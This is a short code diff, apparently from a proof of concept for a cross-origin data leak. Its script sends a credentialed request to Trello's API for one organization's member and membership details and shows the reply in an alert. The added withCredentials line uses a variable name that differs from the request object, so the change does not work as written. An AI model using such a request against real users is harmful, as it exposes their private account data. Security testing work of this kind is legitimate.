@@ -3,6 +3,7 @@
     xhr.onreadystatechange = function() {
             alert(xhr.responseText);
     }
+    xhttp.withCredentials = true;
     xhr.open("GET", "https://trello.com/1/Organizations/5c3c2cc8e0b2420eec089876?members=all&fields=name,displayName,products,prefs,logoHash,idEnterprise,tags,memberships");
     xhr.send();
 </script>
